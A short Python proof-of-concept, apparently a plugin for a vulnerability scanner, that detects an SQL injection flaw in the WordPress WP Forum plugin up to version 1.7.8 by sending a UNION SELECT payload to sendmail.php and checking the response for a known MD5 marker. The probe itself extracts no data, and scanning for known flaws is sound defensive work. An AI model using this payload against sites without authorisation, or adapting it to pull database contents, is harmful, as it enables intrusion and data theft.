#!/usr/bin/env python
# -*- coding: utf-8 -*-
"""
POC Name  :  WordPress WP Forum plugin <= 1.7.8 SQL Injection Vulnerability
From : http://www.exploit-db.com/exploits/17684/
"""
def assign(service, arg):
    if service == "wordpress":
        return True, arg

def audit(arg):
    payload = ("wp-content/plugins/wpforum/sendmail.php?action=quote&id=-1%20UNION%20ALL%20SELECT%20MD5(3.14),2,3")
    target_url=arg + payload
    code, head, res, _, _ = curl.curl("%s" % target_url)
    if code == 200 and '4beed3b9c4a886067de0e3a094246f78' in res:
        security_hole(target_url)

if __name__ == '__main__':
    import sys
    from dummy import *
    audit(assign('wordpress', 'http://www.example.com/')[1])